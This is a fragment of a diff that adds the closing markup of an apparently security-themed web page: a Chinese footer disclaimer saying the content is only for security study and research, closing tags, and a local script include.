+      <p class="muted">本站内容仅供安全学习与技术研究，请勿用于非法用途。</p>
+    </footer>
+  </main>
+</div>
+<script src="../assets/app.js?v=1"></script>
+</body>
+</html>
